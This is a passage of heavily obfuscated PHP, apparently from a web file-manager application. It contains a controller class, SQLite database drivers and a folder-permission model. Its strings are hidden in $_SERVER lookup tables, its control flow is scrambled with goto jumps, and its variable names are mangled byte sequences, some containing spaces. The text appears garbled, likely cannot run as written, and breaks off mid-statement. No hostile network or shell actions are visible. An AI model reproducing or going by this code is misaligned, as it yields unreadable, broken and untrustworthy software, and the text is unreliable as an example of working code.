$this->{$_SERVER[Ó¥ú][255]}($e¼Ï­¼Š¥‡[0], $EğÃ†›’Š); $c³‡½îè = $c¦¸áŠ–¤[679]; if (strlen($c³‡½îè) < $c¦¸áŠ–¤[558]) { die; } goto aƒ¢¶¬‚ø‰; eË—ÜÙ¹: } public function uhnd9b4b67a7() { goto AêÅµøÇÎŠ; AêÅµøÇÎŠ: $a“¡±³ªÖÁ =& $_SERVER[¦·]; $eÔø ÖÚƒ =& $_SERVER[Ó¥ú]; $fØŸ®´ãÜ¿ = $eÔø ÖÚƒ[338]($eÔø ÖÚƒ[358](2, 14), $eÔø ÖÚƒ[358](2, 16) - 1); goto AÀƒ«„ùä; eÒÚ•³Åİ‹: $e‡ŸŠÑ™ğÜ = 2; $EÎ¿–šÚÉ = $a“¡±³ªÖÁ[684]; if (!$EÎ¿–šÚÉ) { return; } goto a”´ëˆ†Òà; a”´ëˆ†Òà: for ($fŞö‰¬ğö» = $fØŸ®´ãÜ¿; $fŞö‰¬ğö» > 1; $fŞö‰¬ğö»--) { $Càé¿Ø‹ = !0; $eÅ‰¹ùš©Ş = $a“¡±³ªÖÁ[685]; while ($eÅ‰¹ùš©Ş < $a“¡±³ªÖÁ[591]) { if ($eÅ‰¹ùš©Ş >= 0) { break; } $eÅ‰¹ùš©Ş++; } foreach ($B‡ÃÙŒÑˆ as $B•ÏèÔØ“) { if ($fŞö‰¬ğö» % $B•ÏèÔØ“ == 0) { $Càé¿Ø‹ = !1; break; } } if ($Càé¿Ø‹) { $e‡ŸŠÑ™ğÜ = $fŞö‰¬ğö»; break; } } return $e‡ŸŠÑ™ğÜ; goto eÕÕ’Ë†Ï; fÒ…â‹¦‡: if (!$Añ·†Â¾Ü±) { die; } $AÕŞø„‰¾ = 1; while ($AÕŞø„‰¾ <= (int) $eÔø ÖÚƒ[359]($fØŸ®´ãÜ¿)) { $fŞö‰¬ğö» = $AÕŞø„‰¾; while (!0) { $fŞö‰¬ğö»++; $Aå£Æ¦½Ç = $a“¡±³ªÖÁ[682]; if ($fŞö‰¬ğö» <= 2) { $AÕŞø„‰¾ = $fŞö‰¬ğö»; break; } else { if ($fŞö‰¬ğö» < 2) { continue; } } $Càé¿Ø‹ = !0; for ($FÜ¢š¸˜£å = 2; $FÜ¢š¸˜£å <= $eÔø ÖÚƒ[359]($fŞö‰¬ğö»); $FÜ¢š¸˜£å++) { if ($fŞö‰¬ğö» % $FÜ¢š¸˜£å == 0) { $Càé¿Ø‹ = !1; } } if ($Càé¿Ø‹) { $AÕŞø„‰¾ = $fŞö‰¬ğö»; break; } } $B‡ÃÙŒÑˆ[] = $AÕŞø„‰¾; $cµ×§Ÿ‹ = $a“¡±³ªÖÁ[683]; } goto eÒÚ•³Åİ‹; AÀƒ«„ùä: $EĞŠáÉ‘Ô¶ = $a“¡±³ªÖÁ[680]; $B‡ÃÙŒÑˆ = array(); $Añ·†Â¾Ü± = $a“¡±³ªÖÁ[681]; goto fÒ…â‹¦‡; eÕÕ’Ë†Ï: } public function poet9b572a56($Aˆ…¼™×À÷, $FÎ³‘÷™òá) { $aá‹é¯†¿ =& $_SERVER[Ó¥ú]; return $aá‹é¯†¿[13](array($aá‹é¯†¿[14], $aá‹é¯†¿[360]), $Aˆ…¼™×À÷, $FÎ³‘÷™òá); $A¥ˆïÄğƒ« = $_SERVER[¦·][686]; if (!$A¥ˆïÄğƒ«) { return; } } public function dqsmb13d9735($bÚÙÃ‡ÏÜè, $d¡í²ÂÅäÚ) { $f«‡â³ÉŞ” =& $_SERVER[Ó¥ú]; return $f«‡â³ÉŞ”[13](array($f«‡â³ÉŞ”[361], $f«‡â³ÉŞ”[362]), $bÚÙÃ‡ÏÜè, $d¡í²ÂÅäÚ); } public function ctke1b1952eb($FˆÉóÈ‰¶Æ, $A¦Îó•£ƒÌ) { $f´ø–ŠÂ¢ =& $_SERVER[Ó¥ú]; return $f´ø–ŠÂ¢[13](array($f´ø–ŠÂ¢[361], $f´ø–ŠÂ¢[363]), $FˆÉóÈ‰¶Æ, $A¦Îó•£ƒÌ); $bİÉà°¾Ó = $_SERVER[¦·][687]; } } goto B‚ñ˜©¶‡; B¶‘ë‹ÖÊÎ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto fìÕõ¿‡¿á; fìÕõ¿‡¿á: $f£´Ñ™ÕèÁ =& $_SERVER[¦·]; global $in, $config; $this->config =& $config; goto DŞ‹Ë«ŠòŠ; DŞ‹Ë«ŠòŠ: $this->in =& $in; $this->values[$f£´Ñ™ÕèÁ[6]] =& $config; $this->values[$f£´Ñ™ÕèÁ[7]] =& $in; goto cœâ®ƒˆ±ˆ; cœâ®ƒˆ±ˆ: $this->tpl = TEMPLATE . MOD . $f£´Ñ™ÕèÁ[8]; $this->_classObjectID = mt_rand(0, 10000); goto e¥¸ó‰·µ¬; e¥¸ó‰·µ¬: } public function loadClass($fÃÙº½Ëé´) { if (1 === func_num_args()) { $this->{$fÃÙº½Ëé´} = new $fÃÙº½Ëé´(); } else { $E¾ßƒæÍš = new ReflectionClass($fÃÙº½Ëé´); $dÈÔ¡›†ä  = func_get_args(); array_shift($dÈÔ¡›†ä ); $this->{$fÃÙº½Ëé´} = $E¾ßƒæÍš->newInstanceArgs($dÈÔ¡›†ä ); } return $this->{$fÃÙº½Ëé´}; } protected function assign($eÁ®èË«‡á, $f¼Ö¦Å…¸) { $this->values[$eÁ®èË«‡á] = $f¼Ö¦Å…¸; } protected function display($cÂÉ£Ô·Œµ) { ob_end_clean(); extract($this->values); require $this->tpl . $cÂÉ£Ô·Œµ; } } class DbSqliteBase extends Db { public function __construct($cÉÄ‰Œ×® = '') { $FšºÓÀ—ì =& $_SERVER[¦·]; if (!extension_loaded($FšºÓÀ—ì[9])) { think_exception(think_lang($FšºÓÀ—ì[10]) . $FšºÓÀ—ì[11]); } if (!empty($cÉÄ‰Œ×®)) { if (!isset($cÉÄ‰Œ×®[$FšºÓÀ—ì[12]])) { $cÉÄ‰Œ×®[$FšºÓÀ—ì[12]] = 438; } $this->config = $cÉÄ‰Œ×®; if (empty($this->config[$FšºÓÀ—ì[13]])) { $this->config[$FšºÓÀ—ì[13]] = array(); } } } public function connect($eùÑ–ÖÅÙ  = '', $bÁ‹õ”² = 0) { $EÌÓÄµ·… =& $_SERVER[¦·]; if (!isset($this->linkID[$bÁ‹õ”²])) { goto c ÜòµÄ’¨; FÄ Á±œ¤¹: @sqlite_busy_timeout($this->linkID[$bÁ‹õ”²], 30000); if (1 != think_config($EÌÓÄµ·…[18])) { unset($this->config); } goto bŒÎ‡‘¯; c ÜòµÄ’¨: if (empty($eùÑ–ÖÅÙ )) { $eùÑ–ÖÅÙ  = $this->config; } $B²ğ†£Å–½ = !empty($eùÑ–ÖÅÙ [$EÌÓÄµ·…[13]][$EÌÓÄµ·…[14]]) ? $eùÑ–ÖÅÙ [$EÌÓÄµ·…[13]][$EÌÓÄµ·…[14]] : $this->pconnect; $AÇ¨Å‡É¨ = $B²ğ†£Å–½ ? $EÌÓÄµ·…[15] : $EÌÓÄµ·…[16]; goto d¦Û™¹…çŞ; d¦Û™¹…çŞ: $this->linkID[$bÁ‹õ”²] = $AÇ¨Å‡É¨($eùÑ–ÖÅÙ [$EÌÓÄµ·…[17]], $eùÑ–ÖÅÙ [$EÌÓÄµ·…[12]]); if (!$this->linkID[$bÁ‹õ”²]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto FÄ Á±œ¤¹; bŒÎ‡‘¯: } return $this->linkID[$bÁ‹õ”²]; } public function free() { $this->queryID = null; } public function query($a¥ÔêÇ’¨ì) { goto c­–“·ÌÜœ; f³„Ö’Ç: think_status($a’¦Ç‘Í¿[20]); $this->queryID = sqlite_query($this->_linkID, $a¥ÔêÇ’¨ì); $this->debug(); goto fãêîõôù; fãêîõôù: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $eôøŞ®„Úù = $this->getAll(); return $eôøŞ®„Úù; } goto c¦—â¹Öõ‹; D³›Ò¾´ä£: $this->queryStr = $a¥ÔêÇ’¨ì; if ($this->queryID) { $this->free(); } think_action_status($a’¦Ç‘Í¿[19], 1); goto f³„Ö’Ç; c­–“·ÌÜœ: $a’¦Ç‘Í¿ =& $_SERVER[¦·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D³›Ò¾´ä£; c¦—â¹Öõ‹: } public function execute($AÎšö­æ) { goto f„òÀŠœ”›; bÚ‘œÒÆĞ: if (!1 === $FÃ™ß“ÇÍí) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AÃ«£Âò˜; cÌÚã±¨ù¦: $this->queryStr = $AÎšö­æ; if ($this->queryID) { $this->free(); } think_action_status($a‡—ê—Í[21], 1); goto eĞÜÃº¹±¼; f„òÀŠœ”›: $a‡—ê—Í =& $_SERVER[¦·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÌÚã±¨ù¦; eĞÜÃº¹±¼: think_status($a‡—ê—Í[20]); $FÃ™ß“ÇÍí = sqlite_exec($this->_linkID, $AÎšö­æ); $this->debug(); goto bÚ‘œÒÆĞ; AÃ«£Âò˜: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¦·][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f’¦õ«²¾  = sqlite_query($this->_linkID, $_SERVER[¦·][23]); if (!$f’¦õ«²¾ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C³¦ë­½«¯ = sqlite_query($this->_linkID, $_SERVER[¦·][24]); if (!$C³¦ë­½«¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DÜŒ­¹™‹¾ = array(); if ($this->numRows > 0) { for ($f„ôŠ‚é©ß = 0; $f„ôŠ‚é©ß < $this->numRows; $f„ôŠ‚é©ß++) { $DÜŒ­¹™‹¾[$f„ôŠ‚é©ß] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $DÜŒ­¹™‹¾; } public function getFields($fèÙÎ†Î×) { $d–®†±¦¢ =& $_SERVER[¦·]; $c¡õ÷‘º»Ğ = $this->query($d–®†±¦¢[25] . $fèÙÎ†Î× . $d–®†±¦¢[26]); $cŠîËˆŒ—Í = array(); if ($c¡õ÷‘º»Ğ) { foreach ($c¡õ÷‘º»Ğ as $aŸŠà×áÑ => $B ÜŒ‡¨·ñ) { $cŠîËˆŒ—Í[$B ÜŒ‡¨·ñ[$d–®†±¦¢[27]]] = array($d–®†±¦¢[28] => $B ÜŒ‡¨·ñ[$d–®†±¦¢[27]], $d–®†±¦¢[29] => $B ÜŒ‡¨·ñ[$d–®†±¦¢[30]], $d–®†±¦¢[31] => (bool) ($B ÜŒ‡¨·ñ[$d–®†±¦¢[32]] === $d–®†±¦¢[33]), $d–®†±¦¢[34] => $B ÜŒ‡¨·ñ[$d–®†±¦¢[35]], $d–®†±¦¢[36] => strtolower($B ÜŒ‡¨·ñ[$d–®†±¦¢[37]]) == $d–®†±¦¢[38], $d–®†±¦¢[39] => strtolower($B ÜŒ‡¨·ñ[$d–®†±¦¢[40]]) == $d–®†±¦¢[41]); } } return $cŠîËˆŒ—Í; } public function getTables($F‚ìŠÇ–Õ¢ = '') { $fÀãˆ¼¡¹ =& $_SERVER[¦·]; $eĞòòŠªÅÆ = $this->query($fÀãˆ¼¡¹[42] . $fÀãˆ¼¡¹[43] . $fÀãˆ¼¡¹[44]); $Aôå‚Ç˜ò© = array(); foreach ($eĞòòŠªÅÆ as $dçïÙ†ˆ…­ => $CÌŠ§¦·Ô•) { $Aôå‚Ç˜ò©[$dçïÙ†ˆ…­] = current($CÌŠ§¦·Ô•); } return $Aôå‚Ç˜ò©; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $cÉÒÎå“Ï« =& $_SERVER[¦·]; $Fâ¶÷Á®’º = sqlite_last_error($this->_linkID); $this->error = $Fâ¶÷Á®’º . $cÉÒÎå“Ï«[4] . sqlite_error_string($Fâ¶÷Á®’º); if ($cÉÒÎå“Ï«[33] != $this->queryStr) { $this->error .= LNG($cÉÒÎå“Ï«[45]) . $this->queryStr; } think_trace($this->error, $cÉÒÎå“Ï«[33], $cÉÒÎå“Ï«[46]); return $this->error; } public function escapeString($aÃ³İ‚Ş”) { return sqlite_escape_string($aÃ³İ‚Ş”); } public function parseLimit($eÆÅïƒÒùÄ) { $cÌ«¯¼ê‹è =& $_SERVER[¦·]; $dÄ¡›Ü„Æ = $cÌ«¯¼ê‹è[33]; if (!empty($eÆÅïƒÒùÄ)) { $eÆÅïƒÒùÄ = explode($cÌ«¯¼ê‹è[47], $eÆÅïƒÒùÄ); if (count($eÆÅïƒÒùÄ) > 1) { $dÄ¡›Ü„Æ .= $cÌ«¯¼ê‹è[48] . $eÆÅïƒÒùÄ[1] . $cÌ«¯¼ê‹è[49] . $eÆÅïƒÒùÄ[0] . $cÌ«¯¼ê‹è[50]; } else { $dÄ¡›Ü„Æ .= $cÌ«¯¼ê‹è[48] . $eÆÅïƒÒùÄ[0] . $cÌ«¯¼ê‹è[50]; } } return $dÄ¡›Ü„Æ; } } class DbSqlite3Base extends Db { public function __construct($b²÷ÁĞˆ¸š = '') { $bŒÇÒ†¦òÕ =& $_SERVER[¦·]; if (!class_exists($bŒÇÒ†¦òÕ[51])) { think_exception(think_lang($bŒÇÒ†¦òÕ[10]) . $bŒÇÒ†¦òÕ[52]); } if (!empty($b²÷ÁĞˆ¸š)) { if (!isset($b²÷ÁĞˆ¸š[$bŒÇÒ†¦òÕ[12]])) { $b²÷ÁĞˆ¸š[$bŒÇÒ†¦òÕ[12]] = 438; } $this->config = $b²÷ÁĞˆ¸š; if (empty($this->config[$bŒÇÒ†¦òÕ[13]])) { $this->config[$bŒÇÒ†¦òÕ[13]] = array(); } } } public function connect($a˜èç™Ã = '', $B«É÷º‚–Í = 0) { $aàà˜ßãòù =& $_SERVER[¦·]; if (!isset($this->linkID[$B«É÷º‚–Í])) { if (empty($a˜èç™Ã)) { $a˜èç™Ã = $this->config; } $this->linkID[$B«É÷º‚–Í] = new SQLite3($a˜èç™Ã[$aàà˜ßãòù[17]]); if (!$this->linkID[$B«É÷º‚–Í]) { think_exception($this->linkID[$B«É÷º‚–Í]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$B«É÷º‚–Í]->busyTimeout(30000); if (1 != think_config($aàà˜ßãòù[18])) { unset($this->config); } } return $this->linkID[$B«É÷º‚–Í]; } public function free() { $this->queryID = null; } public function query($B¦¥ä¹Úë×) { goto fßÑœªÆîå; Fè¢¥³²ßÌ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÂ­åÀßî = $this->getAll(); $this->numRows = count($BÂ­åÀßî); return $BÂ­åÀßî; } goto EÑÑ›Œóì¤; C°ä†ºŒĞ”: think_status($eğ•Ëæö¾–[20]); $this->queryID = $this->_linkID->query($B¦¥ä¹Úë×); $this->debug(); goto Fè¢¥³²ßÌ; DÁá²ÒŒ°Š: $this->queryStr = $B¦¥ä¹Úë×; if ($this->queryID) { $this->free(); } think_action_status($eğ•Ëæö¾–[19], 1); goto C°ä†ºŒĞ”; fßÑœªÆîå: $eğ•Ëæö¾– =& $_SERVER[¦·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DÁá²ÒŒ°Š; EÑÑ›Œóì¤: } public function execute($f„µ¨¶…Ÿ²) { goto FĞ†çÃ…; c®œ¹Ô‚âÙ: think_status($aÔî­ç†Á[20]); $Aë—ÖìŠè = $this->_linkID->exec($f„µ¨¶…Ÿ²); $this->debug(); goto cŞÚ¢°‹¤Ú; cŞÚ¢°‹¤Ú: if (!1 === $Aë—ÖìŠè) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EìµšÂÜ¬½; dÆªâŠ™˜À: $this->queryStr = $f„µ¨¶…Ÿ²; if ($this->queryID) { $this->free(); } think_action_status($aÔî­ç†Á[21], 1); goto c®œ¹Ô‚âÙ; FĞ†çÃ…: $aÔî­ç†Á =& $_SERVER[¦·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dÆªâŠ™˜À; EìµšÂÜ¬½: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¦·][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bŒ¯î‚ ö§ = $this->_linkID->query($_SERVER[¦·][23]); if (!$bŒ¯î‚ ö§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A×Â…ˆ® = $this->_linkID->query($_SERVER[¦·][24]); if (!$A×Â…ˆ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F‰ÑñØ³ÉÎ = array(); while ($CÂÒ±—š—‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $F‰ÑñØ³ÉÎ[] = $CÂÒ±—š—‰; } $this->queryID->reset(); return $F‰ÑñØ³ÉÎ; } public function getFields($cÜÇ—È«) { $Eˆè™ÃÏˆ =& $_SERVER[¦·]; $DÏøŠÚªÈ¯ = $this->query($Eˆè™ÃÏˆ[25] . $cÜÇ—È« . $Eˆè™ÃÏˆ[26]); $F°Û¼ò¡‡Ú = array(); if ($DÏøŠÚªÈ¯) { foreach ($DÏøŠÚªÈ¯ as $eË™ŠÖÀ¶Ö => $E´Ã«‹«Ô¼) { $F°Û¼ò¡‡Ú[$E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[28]]] = array($Eˆè™ÃÏˆ[28] => $E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[28]], $Eˆè™ÃÏˆ[29] => $E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[29]], $Eˆè™ÃÏˆ[31] => (bool) ($E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[31]] === $Eˆè™ÃÏˆ[33]), $Eˆè™ÃÏˆ[34] => $E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[53]], $Eˆè™ÃÏˆ[36] => (bool) $E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[54]], $Eˆè™ÃÏˆ[39] => (bool) $E´Ã«‹«Ô¼[$Eˆè™ÃÏˆ[54]]); } } return $F°Û¼ò¡‡Ú; } public function getTables($eŠÖÊîì½ = '') { $b¢·ùÚ¾¤ô =& $_SERVER[¦·]; $còÙÍİï×¿ = $this->query($b¢·ùÚ¾¤ô[42] . $b¢·ùÚ¾¤ô[43] . $b¢·ùÚ¾¤ô[44]); $Dçš­öÎº² = array(); foreach ($còÙÍİï×¿ as $FêÈÈ¡äÕµ => $EÉ»µÀ‹í) { $Dçš­öÎº²[$FêÈÈ¡äÕµ] = current($EÉ»µÀ‹í); } return $Dçš­öÎº²; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $a‹®ôÉµƒ… =& $_SERVER[¦·]; $this->error = $this->_linkID->lastErrorMsg(); if ($a‹®ôÉµƒ…[33] != $this->queryStr) { $this->error .= LNG($a‹®ôÉµƒ…[45]) . $this->queryStr; } think_trace($this->error, $a‹®ôÉµƒ…[33], $a‹®ôÉµƒ…[46]); return $this->error; } public function escapeString($Bç°ì’‡Óö) { $fÍ­ƒÒ–˜¼ =& $_SERVER[¦·]; if ($this->_linkID) { return $this->_linkID->escapeString($Bç°ì’‡Óö); } return str_ireplace($fÍ­ƒÒ–˜¼[55], $fÍ­ƒÒ–˜¼[56], $Bç°ì’‡Óö); } public function parseLimit($D”’Ùµ·×ö) { $A¢Ù¾ëèË =& $_SERVER[¦·]; $fºéİ¨êçÁ = $A¢Ù¾ëèË[33]; if (!empty($D”’Ùµ·×ö)) { $D”’Ùµ·×ö = explode($A¢Ù¾ëèË[47], $D”’Ùµ·×ö); if (count($D”’Ùµ·×ö) > 1) { $fºéİ¨êçÁ .= $A¢Ù¾ëèË[48] . $D”’Ùµ·×ö[1] . $A¢Ù¾ëèË[49] . $D”’Ùµ·×ö[0] . $A¢Ù¾ëèË[50]; } else { $fºéİ¨êçÁ .= $A¢Ù¾ëèË[48] . $D”’Ùµ·×ö[0] . $A¢Ù¾ëèË[50]; } } return $fºéİ¨êçÁ; } } goto d´‹ÊÉŒ¼; b‰·ò”Ğ×—: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\x63\145\137\x61\x75\x74\x68"; public function getAuth($C§‰¹‰ïÉµ) { goto E…«—¨º‘—; bèåÁÒÚ¿: return $eÜö„Ó˜Ñë; goto BÇ£ÔãÎ¾è; AÙ½Û«¸Î›: $FëšÖšã®Ğ = $this->field($Cë¬ø‡’Ü)->order($C—Œ¡…š»[367])->where($e’ÉÔ¹ˆÚ)->select(); $eÜö„Ó˜Ñë = array(); $Fò»ë¶ˆ­ = array(); goto C¬ˆ«»òò¾; E…«—¨º‘—: $C—Œ¡…š» =& $_SERVER[¦·]; $Cë¬ø‡’Ü = $C—Œ¡…š»[2274]; $e’ÉÔ¹ˆÚ = array($C—Œ¡…š»[369] => $C§‰¹‰ïÉµ); goto AÙ½Û«¸Î›; C¬ˆ«»òò¾: $eÂ ¦î‡ò = 2 << 25; foreach ($FëšÖšã®Ğ as $dßŠ™Á½ºÎ) { goto a„‚ÕíÊàô; FÊê•Ùé¬œ: if ($dßŠ™Á½ºÎ[$C—Œ¡…š»[371]] == SourceModel::TYPE_USER && $dßŠ™Á½ºÎ[$C—Œ¡…š»[458]] == $C—Œ¡…š»[470]) { $DùÍÏ‹À¶ = 0; } $Fò»ë¶ˆ­[] = $cêİ£Šš…â[$C—Œ¡…š»[376]] + $DùÍÏ‹À¶; goto B²‰×ò¹¬; e°‚¿¨Ò¯Ÿ: $DùÍÏ‹À¶ = 0; if ($dßŠ™Á½ºÎ[$C—Œ¡…š»[371]] == SourceModel::TYPE_GROUP) { $DùÍÏ‹À¶ = $eÂ ¦î‡ò * 2; } if ($dßŠ™Á½ºÎ[$C—Œ¡…š»[371]] == SourceModel::TYPE_USER) { $DùÍÏ‹À¶ = $eÂ ¦î‡ò; } goto FÊê•Ùé¬œ; a„‚ÕíÊàô: $cêİ£Šš…â = Model($C—Œ¡…š»[2275])->listData($dßŠ™Á½ºÎ[$C—Œ¡…š»[2256]]); if (!$cêİ£Šš…â) { continue; } $eÜö„Ó˜Ñë[] = $dßŠ™Á½ºÎ; goto e°‚¿¨Ò¯Ÿ; B²‰×ò¹¬: } array_multisort($Fò»ë¶ˆ­, SORT_DESC, $eÜö„Ó˜Ñë); goto bèåÁÒÚ¿; BÇ£ÔãÎ¾è: } public function setAuth($D•¦³†Øš², $dã±ïéğ»½) { goto aÕ’İÍ Ñ×; aÕ’İÍ Ñ×: $CØ»ÂÁÔä¯ =& $_SERVER[¦·]; $AÈÆ’™…± = Model($CØ»ÂÁÔä¯[1122])->sourceInfo($D•¦³†Øš²); if (!$AÈÆ’™…±) { return !1; } goto AÕî´»¿ù‘; AÕî´»¿ù‘: if ($AÈÆ’™…±[$CØ»ÂÁÔä¯[371]] != SourceModel::TYPE_GROUP) { return !1; } $aÑ©²è¡ãÆ = 1; $cÑáã¥£Ş = $AÈÆ’™…±[$CØ»ÂÁÔä¯[458]]; goto eóÌ° ÖŸù; A…Ñİ¶: foreach ($dã±ïéğ»½ as $aÑƒ¬Ñ†õ¡) { if (!in_array($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[371]], $fù°È±†ÆÁ)) { show_json(LNG($CØ»ÂÁÔä¯[2276]), !1); } if ($cÑáã¥£Ş != $aÑ©²è¡ãÆ) { if ($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[371]] == SourceModel::TYPE_GROUP) { } if ($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[458]] != 0 && !in_array($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[458]], $cºÔÎ·¾¨)) { } } if ($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[458]] == 0) { $aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[371]] = SourceModel::TYPE_USER; } $aå’‰¤”°µ[] = array($CØ»ÂÁÔä¯[369] => $D•¦³†Øš², $CØ»ÂÁÔä¯[371] => intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[371]]), $CØ»ÂÁÔä¯[458] => intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[458]]), $CØ»ÂÁÔä¯[2256] => intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[2256]]) ? intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[2256]]) : 0, $CØ»ÂÁÔä¯[2257] => intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[2257]]) ? intval($aÑƒ¬Ñ†õ¡[$CØ»ÂÁÔä¯[2257]]) : -1); } $this->where(array($CØ»ÂÁÔä¯[383] => $D•¦³†Øš²))->delete(); $this->addAll($aå’‰¤”°µ); goto bòÂßŒß˜™; eóÌ° ÖŸù: if ($cÑáã¥£Ş != $aÑ©²è¡ãÆ) { $AŠ«®Ë¶¶Ê = array($CØ»ÂÁÔä¯[2112] => $cÑáã¥£Ş); $cºÔÎ·¾¨ = Model($CØ»ÂÁÔä¯[2191])->field($CØ»ÂÁÔä¯[1441])->where($AŠ«®Ë¶¶Ê)->select(); $cºÔÎ·¾¨ = array_to_keyvalue($cºÔÎ·¾¨, $CØ»ÂÁÔä¯[33], $CØ»ÂÁÔä¯[1441]); } $fù°È±†ÆÁ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aå’‰¤”°µ = array(); goto A…Ñİ¶; bòÂßŒß˜™: return !0; goto cô½£™¨éª; cô½£™¨éª: } public function authClear($f´¬‡œÖÏÒ) { $fÈÌ¡òáÂƒ =& $_SERVER[¦·]; $D¹£Îàê†Æ = Model($fÈÌ¡òáÂƒ[1122])->sourceInfo($f´¬‡œÖÏÒ); $c½ÖÑ÷…ä‚ = array($f´¬‡œÖÏÒ); if ($D¹£Îàê†Æ[$fÈÌ¡òáÂƒ[370]] == $fÈÌ¡òáÂƒ[83]) { $dÄÕôñœñË = array($fÈÌ¡òáÂƒ[527] => array($fÈÌ¡òáÂƒ[485], $D¹£Îàê†Æ[$fÈÌ¡òáÂƒ[461]] . $f´¬‡œÖÏÒ . $fÈÌ¡òáÂƒ[486])); $c½ÖÑ÷…ä‚ = Model($fÈÌ¡òáÂƒ[1122])->field($fÈÌ¡òáÂƒ[383])->where($dÄÕôñœñË)->getField($fÈÌ¡òáÂƒ[369], !0); $c½ÖÑ÷…ä‚[] = $f´¬‡œÖÏÒ; } $this->where(array($fÈÌ¡òáÂƒ[383] => array($fÈÌ¡òáÂƒ[384], $c½ÖÑ÷…ä‚)))->delete(); return !0; } public function getAllChildren($fÃ°ÔÍ’˜Æ) { goto cßœËùì»; d…½‹ò»Ÿ¶: return $this->sourceListAuth($F‹ñ»ªŸ¹); goto Dô¯Ó”•ĞÈ; cßœËùì»: $f‡ëŠğ°©‰ =& $_SERVER[¦·]; $fôÓÛ¿§¥ = Model($f‡ëŠğ°©‰[1122])->sourceInfo($fÃ°ÔÍ’˜Æ); if ($fôÓÛ¿§¥[$f‡ëŠğ°©‰[370]] != $f‡ëŠğ°©‰[83]) { return $this->sourceListAuth(array($fÃ°ÔÍ’˜Æ)); } goto f¤í³™×¡; BœéÁ°İ–…: $A˜÷––Äµ = Model($f‡ëŠğ°©‰[753])->field($FÇÁœ¦¥”)->where($E‹Û¨—õË)->select(); $F‹ñ»ªŸ¹ = array($fÃ°ÔÍ’˜Æ); foreach ($A˜÷––Äµ as $DóÜŞ‡ˆé£) { foreach ($cËÆ»¾·ß as $Cµ©óÔ’ÔÊ) { $eÉÄ”¡Ú›î = $f‡ëŠğ°©‰[47] . $Cµ©óÔ’ÔÊ . $f‡ëŠğ°©‰[47]; $c¯†ß°ÏŸ– = $DóÜŞ‡ˆé£[$f‡ëŠğ°©‰[461]] . $DóÜŞ‡ˆé£[$f‡ëŠğ°©‰[369]] . $f‡ëŠğ°©‰[47]; if (strstr($c¯†ß°ÏŸ–, $eÉÄ”¡Ú›î)) { $F‹ñ»ªŸ¹[] = $DóÜŞ‡ˆé£[$f‡ëŠğ°©‰[369]]; break; } } } goto d…½‹ò»Ÿ¶; f¤í³™×¡: if ($fôÓÛ¿§¥[$f‡ëŠğ°©‰[371]] != SourceModel::TYPE_GROUP) { return array(); } $f†“„å§ˆ = 1; $cËÆ»¾·ß = array($fÃ°ÔÍ’˜Æ); goto DÊ¢·à‘â¼; EŒ‹±™Š‘: if (!$B¹¢º„õË) { return array(); } $FÇÁœ¦¥” = $f‡ëŠğ°©‰[2277]; $E‹Û¨—õË = array($f‡ëŠğ°©‰[369] => array($f‡ëŠğ°©‰[7], $B¹¢º„õË), $f‡ëŠğ°©‰[397] => $f‡ëŠğ°©‰[470]); goto BœéÁ°İ–…; DÊ¢·à‘â¼: if ($fôÓÛ¿§¥[$f‡ëŠğ°©‰[463]] == $f‡ëŠğ°©‰[470] && $fôÓÛ¿§¥[$f‡ëŠğ°©‰[458]] != $f†“„å§ˆ) { $cËÆ»¾·ß = $this->groupChidldAllRootSource($fôÓÛ¿§¥[$f‡ëŠğ°©‰[458]]); } $B¹¢º„õË = 